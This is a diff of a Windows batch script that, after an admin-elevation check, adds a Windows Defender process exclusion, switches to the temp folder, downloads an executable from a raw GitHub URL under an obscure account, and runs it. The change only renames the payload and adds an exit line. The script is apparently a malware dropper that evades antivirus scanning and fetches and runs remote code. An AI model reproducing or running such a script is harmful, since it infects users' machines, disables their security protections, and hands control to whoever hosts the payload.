@@ -22,11 +22,12 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 
-powershell  Set-MpPreference -ExclusionProcess "CMMON32.exe"
+powershell  Set-MpPreference -ExclusionProcess "R2Tf11dq2.exe"
 cd %TEMP%
 
 
-powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON32.exe' -OutFile CMMON32.exe" 
-Start CMMON32.exe
+powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/R2Tf11dq2.exe' -OutFile R2Tf11dq2.exe" 
+Start R2Tf11dq2.exe
 
+EXIT /B
 
